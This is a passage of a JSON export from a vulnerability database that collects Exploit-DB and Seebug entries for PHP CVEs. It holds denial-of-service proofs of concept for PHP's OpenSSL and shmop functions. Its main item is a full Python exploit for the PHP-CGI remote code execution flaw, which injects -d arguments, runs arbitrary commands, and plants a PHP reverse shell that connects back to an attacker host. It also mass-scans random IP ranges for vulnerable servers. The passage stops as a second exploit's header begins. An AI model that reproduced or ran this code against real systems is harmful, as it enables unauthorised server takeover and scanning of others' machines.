            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 46977\r\nCVE ID: CVE-2011-1468\r\n\r\nPHP\u662f\u5e7f\u6cdb\u4f7f\u7528\u7684\u901a\u7528\u76ee\u7684\u811a\u672c\u8bed\u8a00\uff0c\u7279\u522b\u9002\u5408\u4e8eWeb\u5f00\u53d1\uff0c\u53ef\u5d4c\u5165\u5230HTML\u4e2d\u3002\r\n\r\nPHP \u201cOpenSSL\u201d\u6269\u5c55\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u6b64\u6f0f\u6d1e\u6d88\u8017\u5927\u91cf\u5185\u5b58\uff0c\u9020\u6210\u62d2\u7edd\u670d\u52a1\u3002\n\nMandrakeSoft Corporate Server 4.0 x86_64\r\nMandrakeSoft Corporate Server 4.0\r\nPHP PHP 5.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2011-03-27T00:00:00",
            "published": "2011-03-27T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-20391",
            "id": "SSV:20391",
            "title": "PHP &quot;OpenSSL&quot;\u6269\u5c55\u591a\u4e2a\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "\n                                                &lt;?php\r\n\r\n$data = &quot;jfdslkjvflsdkjvlkfjvlkjfvlkdm,4w 043920r 9234r 32904r 09243 r7-89437 r892374 r894372 r894 7289r7 f  frwerfh i iurf iuryw uyrfouiwy ruy 972439 8478942 yrhfjkdhls&quot;;\r\n$pass = &quot;r23498rui324hjbnkj&quot;;\r\n\r\n$maxi = 200000;\r\n$t = microtime(1);\r\nfor ($i=0;$i&lt;$maxi; $i++){\r\n    openssl_encrypt($data.$i, 'des3', $pass, false, '1qazxsw2');\r\n}\r\n$t = microtime(1)-$t;\r\nprint &quot;mode: openssl_encrypt ($maxi) tests takes &quot;.$t.&quot;secs &quot;.($maxi/$t).&quot;#/sec \\n&quot;;\r\n\r\n?&gt;\r\n\n                              ",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:20391"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.x OpenSSL Extension openssl_encrypt Function Plaintext Data Memory Leak DoS. CVE-2011-1468. Dos exploit for php platform",
            "modified": "2011-03-08T00:00:00",
            "published": "2011-03-08T00:00:00",
            "id": "EDB-ID:35486",
            "href": "https://www.exploit-db.com/exploits/35486/",
            "type": "exploitdb",
            "title": "PHP 5.x OpenSSL Extension openssl_encrypt Function Plaintext Data Memory Leak DoS",
            "sourceData": "source: http://www.securityfocus.com/bid/46977/info\r\n\r\nPHP is prone to multiple remote denial-of-service vulnerabilities that affect the 'OpenSSL' extension.\r\n\r\nSuccessful attacks will cause the application to consume excessive memory, creating a denial-of-service condition.\r\n\r\nVersions prior to PHP 5.3.6 are vulnerable. \r\n\r\n<?php\r\n\r\n$data = \"jfdslkjvflsdkjvlkfjvlkjfvlkdm,4w 043920r 9234r 32904r 09243 r7-89437 r892374 r894372 r894 7289r7 f  frwerfh i iurf iuryw uyrfouiwy ruy 972439 8478942 yrhfjkdhls\";\r\n$pass = \"r23498rui324hjbnkj\";\r\n\r\n$maxi = 200000;\r\n$t = microtime(1);\r\nfor ($i=0;$i<$maxi; $i++){\r\n\topenssl_encrypt($data.$i, 'des3', $pass, false, '1qazxsw2');\r\n}\r\n$t = microtime(1)-$t;\r\nprint \"mode: openssl_encrypt ($maxi) tests takes \".$t.\"secs \".($maxi/$t).\"#/sec \\n\";\r\n\r\n?>",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:35486"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP 5.x OpenSSL Extension x Function openssl_decrypt Ciphertext Data Memory Leak DoS. CVE-2011-1468. Dos exploit for php platform",
            "modified": "2011-03-08T00:00:00",
            "published": "2011-03-08T00:00:00",
            "id": "EDB-ID:35487",
            "href": "https://www.exploit-db.com/exploits/35487/",
            "type": "exploitdb",
            "title": "PHP 5.x OpenSSL Extension x Function openssl_decrypt Ciphertext Data Memory Leak DoS",
            "sourceData": "source: http://www.securityfocus.com/bid/46977/info\r\n \r\nPHP is prone to multiple remote denial-of-service vulnerabilities that affect the 'OpenSSL' extension.\r\n \r\nSuccessful attacks will cause the application to consume excessive memory, creating a denial-of-service condition.\r\n \r\nVersions prior to PHP 5.3.6 are vulnerable. \r\n\r\n<?php\r\n\r\n$data = \"jfdslkjvflsdkjvlkfjvlkjfvlkdm,4w 043920r 9234r 32904r 09243 r7-89437 r892374 r894372 r894 7289r7 f  frwerfh i iurf iuryw uyrfouiwy ruy 972439 8478942 yrhfjkdhls\";\r\n$pass = \"r23498rui324hjbnkj\";\r\n\r\n$maxi = 200000;\r\n$t = microtime(1);\r\nfor ($i=0;$i<$maxi; $i++){\r\n\t$cr = openssl_encrypt($data.$i, 'des3', $pass, false, '1qazxsw2');\r\n\t$dcr = openssl_decrypt($cr, 'des3', $pass, false, '1qazxsw2');\r\n\tif ($dcr != $data.$i){\r\n\t\tprint \"at step $i decryption failed\\n\";\r\n\t}\r\n}\r\n$t = microtime(1)-$t;\r\nprint \"mode: openssl_encrypt ($maxi) tests takes \".$t.\"secs \".($maxi/$t).\"#/sec \\n\";\r\n?>\r\n\r\nfixes by add this code at line 4818 at the end of openssl_decrypt:\r\n\tEVP_CIPHER_CTX_cleanup(&cipher_ctx);\r\n\r\n\r\n?>\r\n",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:35487"
        }
    ],
    "CVE-2011-1092": [
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2014-07-01T00:00:00",
            "published": "2014-07-01T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-71455",
            "id": "SSV:71455",
            "title": "PHP <= 5.3.6 shmop_read() Integer Overflow DoS",
            "type": "seebug",
            "sourceData": "\n                                                &#60;?php\r\n# Exploit Title: PHP &#60;=5.3.5 Integer Overflow DoS\r\n# Date: 12-03-11\r\n# Author: Jose Carlos Norte - www.rooibo.com\r\n# Software Link: www.php.net\r\n# Version: &#60;= 5.3.5\r\n# Tested on: Ubuntu Linux\r\n# CVE : CVE-2011-1092\r\n\r\n$shm_key = ftok(__FILE__, &#39;t&#39;);\r\n$shm_id = shmop_open($shm_key, &#34;c&#34;, 0644, 100);\r\n$shm_data = shmop_read($shm_id, 1, 2147483647);\r\n//if there is no segmentation fault past this point, we have 2gb of memory!\r\n//or we are in a patched php\r\necho &#34;this php version is not vulnerable!&#34;;\r\n\r\n?&#62;\r\n\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:71455"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP <= 5.3.6 shmop_read() Integer Overflow DoS. CVE-2011-1092. Dos exploit for linux platform",
            "modified": "2011-03-12T00:00:00",
            "published": "2011-03-12T00:00:00",
            "id": "EDB-ID:16966",
            "href": "https://www.exploit-db.com/exploits/16966/",
            "type": "exploitdb",
            "title": "PHP <= 5.3.6 shmop_read Integer Overflow DoS",
            "sourceData": "<?php\r\n# Exploit Title: PHP <=5.3.5 Integer Overflow DoS\r\n# Date: 12-03-11\r\n# Author: Jose Carlos Norte - www.rooibo.com\r\n# Software Link: www.php.net\r\n# Version: <= 5.3.5\r\n# Tested on: Ubuntu Linux\r\n# CVE : CVE-2011-1092\r\n\r\n$shm_key = ftok(__FILE__, 't');\r\n$shm_id = shmop_open($shm_key, \"c\", 0644, 100);\r\n$shm_data = shmop_read($shm_id, 1, 2147483647);\r\n//if there is no segmentation fault past this point, we have 2gb of memory!\r\n//or we are in a patched php\r\necho \"this php version is not vulnerable!\";\r\n\r\n?>\r\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:16966"
        }
    ],
    "CVE-2012-1172": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 53403\r\nCVE ID: CVE-2012-1172\r\n\r\nPHP\u662f\u4e00\u79cdHTML\u5185\u5d4c\u5f0f\u7684\u8bed\u8a00\uff0cPHP\u4e0e\u5fae\u8f6f\u7684ASP\u9887\u6709\u51e0\u5206\u76f8\u4f3c\uff0c\u90fd\u662f\u4e00\u79cd\u5728\u670d\u52a1\u5668\u7aef\u6267\u884c\u7684\u5d4c\u5165HTML\u6587\u6863\u7684\u811a\u672c\u8bed\u8a00\uff0c\u8bed\u8a00\u7684\u98ce\u683c\u6709\u7c7b\u4f3c\u4e8eC\u8bed\u8a00\uff0c\u73b0\u5728\u88ab\u5f88\u591a\u7684\u7f51\u7ad9\u7f16\u7a0b\u4eba\u5458\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002\r\n\r\nPHP\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u5229\u7528\u5e26\u6709\u76ee\u5f55\u904d\u5386\u5e8f\u5217\u7684\u7279\u5236\u8bf7\u6c42\u68c0\u7d22\u3001\u7834\u574f\u6216\u4e0a\u4f20\u4efb\u610f\u4f4d\u7f6e\u4e0a\u7684\u4efb\u610f\u6587\u4ef6\u3002\r\n0\r\nPHP 5.3.x\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nPHP\r\n---\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://www.php.net",
            "modified": "2012-05-09T00:00:00",
            "published": "2012-05-09T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-60103",
            "id": "SSV:60103",
            "type": "seebug",
            "title": "PHP 5.3.x\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:60103"
        }
    ],
    "CVE-2012-2311": [
        {
            "bulletinFamily": "exploit",
            "description": "Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution (Multithreaded Scanner) (2). CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for PHP ...",
            "modified": "2013-11-01T00:00:00",
            "published": "2013-11-01T00:00:00",
            "id": "EDB-ID:40233",
            "href": "https://www.exploit-db.com/exploits/40233/",
            "type": "exploitdb",
            "title": "Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution (Multithreaded Scanner) (2)",
            "sourceData": "",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:40233"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache + PHP 5.x - Remote Code Execution (Multithreaded Scanner) (2). CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for php platform",
            "modified": "2013-10-31T00:00:00",
            "published": "2013-10-31T00:00:00",
            "id": "EDB-ID:29316",
            "href": "https://www.exploit-db.com/exploits/29316/",
            "type": "exploitdb",
            "title": "Apache + PHP 5.x - Remote Code Execution Multithreaded Scanner 2",
            "sourceData": "#!/usr/bin/env python\r\n#\r\n# ap-unlock-v2.py - apache + php 5.* rem0te c0de execution 0day (better version)\r\n#\r\n# NOTE:\r\n#   - quick'n'dirty VERY UGLYY C=000DEEE IZ N0T MY STYLE :(((\r\n#   - for connect back shell start netcat/nc and bind port on given host:port\r\n#   - is ip-range scanner not is multithreaded, but iz multithreaded iz in\r\n#   random scanner and is scanner from file (greets to MustLive)\r\n#   - no ssl support\r\n#   - more php paths can be added\r\n#   - adjust this shit for windows b0xes\r\n#\r\n# 2013\r\n# by noptrix - http://nullsecurity.net/\r\n\r\nimport sys\r\nimport socket\r\nimport argparse\r\nimport threading\r\nimport time\r\nimport random\r\nimport select\r\n\r\n\r\nNONE = 0\r\nVULN = 1\r\nSCMD = 2\r\nXPLT = 3\r\n\r\nt3st = 'POST /cgi-bin/php/%63%67%69%6E/%70%68%70?%2D%64+%61%6C%75%6F%6E+%2D' \\\r\n        '%64+%6D%6F%64+%2D%64+%73%75%68%6F%6E%3D%6F%6E+%2D%64+%75%6E%63%74%73' \\\r\n        '%3D%22%22+%2D%64+%64%6E%65+%2D%64+%61%75%74%6F%5F%70%72%%74+%2D%64+' \\\r\n        '%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+'\\\r\n        '%74%5F%3D%30+%2D%64+%75%74+%2D%6E HTTP/1.1\\r\\nHost:localhost\\r\\n'\\\r\n        'Content-Type: text/html\\r\\nContent-Length:1\\r\\n\\r\\na\\r\\n'\r\n\r\n\r\ndef m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt):\r\n    c0nn_b4ck = \\\r\n    '''\r\n    <? set_time_limit (0); $VERSION = \"1.0\"; $ip = \"''' + cb_h0st + '''\";\r\n    $port = ''' + cb_p0rt + '''; $chunk_size = 1400; $write_a = null;\r\n    $error_a = null; $shell = \"unset HISTFILE; id; /bin/sh -i\"; $daemon = 0;\r\n    $debug = 0; if (function_exists(\"pcntl_fork\")) {$pid = pcntl_fork();\r\n    if ($pid == -1) {exit(1);}if ($pid) {exit(0);}if (posix_setsid() == -1) {\r\n    exit(1);}$daemon = 1;} else {print \"bla\";}chdir(\"/\");umask(0);\r\n    $sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) {\r\n    printit(\"$errstr ($errno)\");exit(1);}$descriptorspec = array(\r\n    0 => array(\"pipe\", \"r\"), 1 => array(\"pipe\", \"w\"),2 => array(\"pipe\", \"w\"));\r\n    $process = proc_open($shell, $descriptorspec, $pipes);\r\n    if (!is_resource($process)) {exit(1);}stream_set_blocking($pipes[1], 0);\r\n    stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);\r\n    printit(\"Successfully opened reverse shell to $ip:$port\");while (1) {\r\n    if (feof($sock)) {printit(\"ERROR: Shell connection terminated\");break;}\r\n    if (feof($pipes[1])) {printit(\"ERROR: Shell process terminated\");break;}\r\n\t$read_a = array($sock, $pipes[1], $pipes[2]);\r\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\r\n    if (in_array($sock, $read_a)) {if ($debug) printit(\"SOCK READ\");\r\n\t$input = fread($sock, $chunk_size);if ($debug) printit(\"SOCK: $input\");\r\n    fwrite($pipes[0], $input);}if (in_array($pipes[1], $read_a)) {\r\n    if ($debug) printit(\"STDOUT READ\");$input = fread($pipes[1], $chunk_size);\r\n\tif ($debug) printit(\"STDOUT: $input\");fwrite($sock, $input);}\r\n\tif (in_array($pipes[2], $read_a)) {if ($debug) printit(\"STDERR READ\");\r\n    $input = fread($pipes[2], $chunk_size);\r\n    if ($debug) printit(\"STDERR: $input\");fwrite($sock, $input);}}fclose($sock);\r\n    fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);\r\n    function printit ($string) {if (!$daemon) {print \"$string\\n\";}}?>\r\n    '''\r\n    return c0nn_b4ck\r\n\r\n\r\ndef enc0dez():\r\n    n33dz1 = ('cgi-bin', 'php')\r\n    n33dz2 = ('-d', 'allow_url_include=on', '-d', 'safe_mode=off', '-d',\r\n            'suhosin.simulation=on', '-d', 'disable_functions=\"\"', '-d',\r\n            'open_basedir=none', '-d', 'auto_prepend_file=php://input',\r\n            '-d', 'cgi.force_redirect=0', '-d', 'cgi.redirect_status_env=0',\r\n            '-d', 'auto_prepend_file=php://input', '-n')\r\n    fl4g = 0\r\n    arg5 = ''\r\n    p4th = ''\r\n    plus = ''\r\n \r\n    for x in n33dz2:\r\n        if fl4g == 1:\r\n            plus = '+'\r\n        arg5 = arg5 + plus + \\\r\n                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)\r\n        fl4g = 1\r\n    for x in n33dz1:\r\n        p4th = p4th + '/' + \\\r\n                ''.join('%' + c.encode('utf-8').encode('hex') for c in x)\r\n    return (p4th.upper(), arg5.upper())\r\n\r\n\r\ndef m4k3_p4yl0rd(p4yl0rd, m0de):\r\n    p4th, arg5 = enc0dez()\r\n    if m0de == VULN:\r\n        p4yl0rd = t3st\r\n    elif m0de == SCMD or m0de == XPLT:\r\n        p4yl0rd = 'POST /' + p4th + '?' + arg5 + ' HTTP/1.1\\r\\n' \\\r\n                'Host: ' + sys.argv[1] + '\\r\\n' \\\r\n                'Content-Type: application/x-www-form-urlencoded\\r\\n' \\\r\n                'Content-Length: ' + str(len(p4yl0rd)) + '\\r\\n\\r\\n' + p4yl0rd\r\n    return p4yl0rd\r\n\r\n\r\ndef s3nd_sh1t(args, m0de, c0nn_b4ck):\r\n    pat = '<b>Parse error</b>:'\r\n    try:\r\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        s.settimeout(float(args.t))\r\n        res = s.connect_ex((args.h, int(args.p)))\r\n        if res == 0:\r\n            if m0de == VULN:\r\n                p4yl0rd = m4k3_p4yl0rd('', m0de)\r\n                s.sendall(p4yl0rd)\r\n                if pat in s.recv(4096):\r\n                    print \"--> \" + args.h + \" vu1n\"\r\n                    return args.h\r\n                else:\r\n                    if args.v:\r\n                        print \"--> %s n0t vu1n\" % (args.h)\r\n                    return\r\n            elif m0de == SCMD:\r\n                p4yl0rd = m4k3_p4yl0rd('<? system(\"' + args.c + '\"); ?>', m0de)\r\n                s.sendall(p4yl0rd)\r\n                rd, wd, ex = select.select([s], [], [], float(args.t))\r\n                if rd:\r\n                    for line in s.makefile():\r\n                        print line,\r\n            elif m0de == XPLT:\r\n                p4yl0rd = m4k3_p4yl0rd(c0nn_b4ck, m0de)\r\n                s.sendall(p4yl0rd)\r\n        else:\r\n            if args.v:\r\n                print \"--> n0 w3bs3rv3r 0n %s\" % (args.h)\r\n    except socket.error:\r\n        return\r\n    return\r\n\r\n\r\ndef m4k3_r4nd_1p4ddr(num):\r\n    h0sts = []\r\n    for x in range(int(num)):\r\n        h0sts.append('%d.%d.%d.%d' % (random.randrange(0,255),\r\n                random.randrange(0,255), random.randrange(0,255),\r\n                random.randrange(0,255)))\r\n    return h0sts\r\n\r\n\r\ndef sc4n_r4nd0m(args, h0st, m0de, vu1nz):\r\n    args.h = h0st\r\n    vu1nz.append(s3nd_sh1t(args, m0de, None))\r\n    vu1nz = filter(None, vu1nz)\r\n    return\r\n\r\n\r\ndef sc4n_fr0m_f1le(args, h0st, m0de, vu1nz):\r\n    args.h = h0st.rstrip()\r\n    vu1nz.append(s3nd_sh1t(args, m0de, None))\r\n    vu1nz = filter(None, vu1nz)\r\n    return\r\n\r\n\r\ndef sc4n_r4ng3(rsa, rsb, args, m0de):\r\n    vu1nz = []\r\n    for i in range (rsa[0], rsb[0]):\r\n        for j in range (rsa[1], rsb[1]):\r\n            for k in range (rsa[2], rsb[2]):\r\n                for l in range(rsa[3], rsb[3]):\r\n                    args.h = str(i) + \".\" + str(j) + \".\" + str(k) + \".\" + str(l)\r\n                    vu1nz.append(s3nd_sh1t(args, m0de, None))\r\n                    time.sleep(0.005)\r\n    vu1nz = filter(None, vu1nz)\r\n    return vu1nz\r\n\r\n\r\ndef m4k3_ipv4_r4ng3(iprange):\r\n    a = tuple(part for part in iprange.split('.'))\r\n    rsa = (range(4))\r\n    rsb = (range(4))\r\n    for i in range(0,4):\r\n        ga = a[i].find('-')\r\n        if ga != -1:\r\n            rsa[i] = int(a[i][:ga])\r\n            rsb[i] = int(a[i][1+ga:]) + 1                                        \r\n        else:\r\n            rsa[i] = int(a[i])\r\n            rsb[i] = int(a[i]) + 1\r\n    return (rsa, rsb)\r\n\r\n\r\ndef parse_args():\r\n    p = argparse.ArgumentParser(\r\n    usage='\\n\\n  ./ap-unlock-v2.py -h <4rg> -s | -c <4rg> | -x <4rg> [0pt1ons]'\\\r\n            '\\n  ./ap-unlock-v2.py -r <4rg> | -R <4rg> | -i <4rg> [0pt1ons]',\r\n    formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)\r\n    opts = p.add_argument_group('0pt1ons', '')\r\n    opts.add_argument('-h', metavar='wh1t3h4tz.0rg',\r\n            help='| t3st s1ngle h0st f0r vu1n')\r\n    opts.add_argument('-p', default=80, metavar='80',\r\n            help='| t4rg3t p0rt (d3fau1t: 80)')\r\n    opts.add_argument('-c', metavar='\\'uname -a;id\\'',\r\n            help='| s3nd c0mm4nds t0 h0st')\r\n    opts.add_argument('-x', metavar='192.168.0.2:1337',\r\n            help='| c0nn3ct b4ck h0st 4nd p0rt f0r sh3ll')\r\n    opts.add_argument('-s', action='store_true',\r\n            help='| t3st s1ngl3 h0st f0r vu1n')\r\n    opts.add_argument('-r', metavar='133.1.3-7.7-37',\r\n            help='| sc4nz iP addr3ss r4ng3 f0r vu1n')\r\n    opts.add_argument('-R', metavar='1337',\r\n            help='| sc4nz num r4nd0m h0st5 f0r vu1n')\r\n    opts.add_argument('-t', default=3, metavar='3',\r\n            help='| t1me0ut in s3x (d3fau1t: 3)')\r\n    opts.add_argument('-f', metavar='vu1n.lst',\r\n            help='| wr1t3 vu1n h0sts t0 f1l3')\r\n    opts.add_argument('-i', metavar='sc4nz.lst',\r\n            help='| sc4nz h0sts fr0m f1le f0r vu1n')\r\n    opts.add_argument('-S', metavar='2',\r\n            help='| sl33pz in s3x b3tw33n thr3adz (d3fault: 2)')\r\n    opts.add_argument('-T', default=2, metavar='4',\r\n            help='| nuM sc4n thr3adz (d3fault: 4)')\r\n    opts.add_argument('-v', action='store_true',\r\n            help='| pr1nt m0ah 1nf0z wh1l3 sh1tt1ng')\r\n    args = p.parse_args()\r\n    if not args.h and not args.r and not args.R and not args.i:\r\n        p.print_help()\r\n        sys.exit(0)\r\n    return args\r\n\r\n\r\ndef wr1te_fil3(args, vu1nz):\r\n    if args.f:\r\n        if vu1nz:\r\n            try:\r\n                f = open(args.f, \"w\")\r\n                f.write(\"\\n\".join(vu1nz)+\"\\n\")\r\n                f.close()\r\n            except:\r\n                sys.stderr.write('de1n3 mudd1 k0cht guT')\r\n                sys.stderr.write('\\n')\r\n                raise SystemExit()\r\n    return\r\n\r\n\r\ndef c0ntr0ller():\r\n    vu1nz = []\r\n    m0de = NONE\r\n    try:\r\n        args = parse_args()\r\n        if not args.t:\r\n            args.t = float(3)\r\n        if args.h:\r\n            if args.s:\r\n                print \"[+] sc4nn1ng s1ngl3 h0st %s \" % (args.h)\r\n                m0de = VULN\r\n                s3nd_sh1t(args, m0de, None)\r\n            elif args.c:\r\n                print \"[+] s3nd1ng c0mm4ndz t0 h0st %s \" % (args.h)\r\n                m0de = SCMD\r\n                s3nd_sh1t(args, m0de, None)\r\n            elif args.x:\r\n                print \"[+] xpl0it1ng b0x %s \" % (args.h)\r\n                m0de = XPLT\r\n                if args.x.find(':') != -1:\r\n                    if not args.x.split(':')[1]:\r\n                        print \"[-] 3rr0r: p0rt m1ss1ng\"\r\n                    else:\r\n                        cb_h0st = args.x.split(':')[0]\r\n                        cb_p0rt = args.x.split(':')[1]\r\n                else:\r\n                    print \"[-] 3rr0r: <h0st>:<p0rt> y0u l4m3r\"\r\n                c0nn_b4ck = m4ke_c0nn_b4ck_sh1t(cb_h0st, cb_p0rt)\r\n                s3nd_sh1t(args, m0de, c0nn_b4ck)\r\n            else:\r\n                print \"[-] 3rr0r: m1ss1ng -s, -c 0r -x b1tch\"\r\n                sys.exit(-1)\r\n        if args.r:\r\n            print \"[+] sc4nn1ng r4ng3 %s \" % (args.r)\r\n            m0de = VULN\r\n            rsa, rsb = m4k3_ipv4_r4ng3(args.r)\r\n            vu1nz = sc4n_r4ng3(rsa, rsb, args, m0de)\r\n        if args.R:\r\n            print \"[+] sc4nn1ng %d r4nd0m b0xes\" % (int(args.R))\r\n            m0de = VULN\r\n            if not args.S:\r\n                args.S = float(2)\r\n            h0sts = m4k3_r4nd_1p4ddr(int(args.R))\r\n            for h0st in h0sts:\r\n                try:\r\n                    t = threading.Thread(target=sc4n_r4nd0m, args=(args, h0st,\r\n                        m0de, vu1nz))\r\n                    t.start()\r\n                    time.sleep(float(args.S))\r\n                    while threading.activeCount() > int(args.T):\r\n                        time.sleep(2)\r\n                except:\r\n                    sys.stdout.flush()\r\n                    sys.stdout.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")\r\n                    raise SystemExit\r\n        if args.i:\r\n            print \"[+] sc4nn1ng b0xes fr0m f1le %s\" % (args.i)\r\n            m0de = VULN\r\n            h0sts = tuple(open(args.i, 'r'))\r\n            if not args.S:\r\n                args.S = float(2)\r\n            for h0st in h0sts:\r\n                try:\r\n                    t = threading.Thread(target=sc4n_fr0m_f1le, args=(args,\r\n                        h0st, m0de, vu1nz))\r\n                    t.start()\r\n                    time.sleep(float(args.S))\r\n                    while threading.activeCount() > int(args.T):\r\n                        time.sleep(2)\r\n                except KeyboardInterrupt:\r\n                    sys.stdout.flush()\r\n                    sys.stdout.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")\r\n                    raise SystemExit\r\n            #sc4n_fr0m_f1le(args, h0sts, m0de, vu1nz)\r\n    except KeyboardInterrupt:\r\n        sys.stdout.flush()\r\n        sys.stderr.write(\"\\b\\b[!] w4rn1ng: ab0rt3d bY us3r\\n\")\r\n        raise SystemExit\r\n    wr1te_fil3(args, vu1nz)\r\n\r\n    return\r\n\r\n\r\ndef m41n():\r\n    if  __name__ == \"__main__\":\r\n        print \"--==[ ap-unlock-v2.py by noptrix@nullsecurity.net ]==--\"\r\n        c0ntr0ller()\r\n    else:\r\n        print \"[-] 3rr0r: y0u fuck3d up dud3\"\r\n        sys.exit(1)\r\n    print \"[+] h0p3 1t h3lp3d\"\r\n\r\n\r\n# \\o/ fr33 requiem 1337 h4x0rs ... \r\nm41n()\r\n\r\n# e0F",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:29316"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Apache / PHP 5.x - cgi-bin Remote Code Execution Exploit. CVE-2012-1823,CVE-2012-2311,CVE-2012-2336. Remote exploit for linux platform",
            "modified": "2013-10-29T00:00:00",
            "published": "2013-10-29T00:00:00",
            "id": "EDB-ID:29290",
            "href": "https://www.exploit-db.com/exploits/29290/",
            "type": "exploitdb",
            "title": "Apache / PHP 5.x - cgi-bin Remote Code Execution Exploit",
            "sourceData": "/* Apache Magica by Kingcope */\r\n/* gcc apache-magika.c -o apache-magika -lssl */\r\n/* This is a code execution bug in the combination of Apache and PHP.\r\nOn Debian and Ubuntu the vulnerability is present in the default install\r\nof the php5-cgi package. When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with Suhosin-Patch\r\nAffected versions\r\nPHP prior to 5.3.12\r\nPHP prior to 5.4.2\r\nUnaffected versions\r\nPHP 4 - getopt parser unexploitable\r\nPHP 5.3.12 and up\r\nPHP 5.4.2 and up\r\nUnaffected versions are patched by CVE-2012-1823.\r\n*/\r\n/*    .\r\n     